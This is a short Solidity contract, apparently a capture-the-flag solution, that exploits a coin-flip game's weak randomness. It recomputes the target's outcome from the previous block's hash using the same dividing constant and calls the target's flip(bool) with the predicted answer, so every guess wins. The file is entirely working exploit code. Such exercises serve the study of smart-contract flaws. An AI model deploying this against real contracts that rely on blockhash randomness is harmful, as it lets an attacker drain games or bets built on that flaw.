// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Guesser {
    address cf;

    constructor(address _cf) {
        cf = _cf;
    }

    function guess() external returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;

        (bool success, bytes memory data) = cf.call(abi.encodeWithSignature("flip(bool)", side));
        require(success, "Could not call flip");

        bool correctGuess = abi.decode(data, (bool));

        return correctGuess;
    }
}
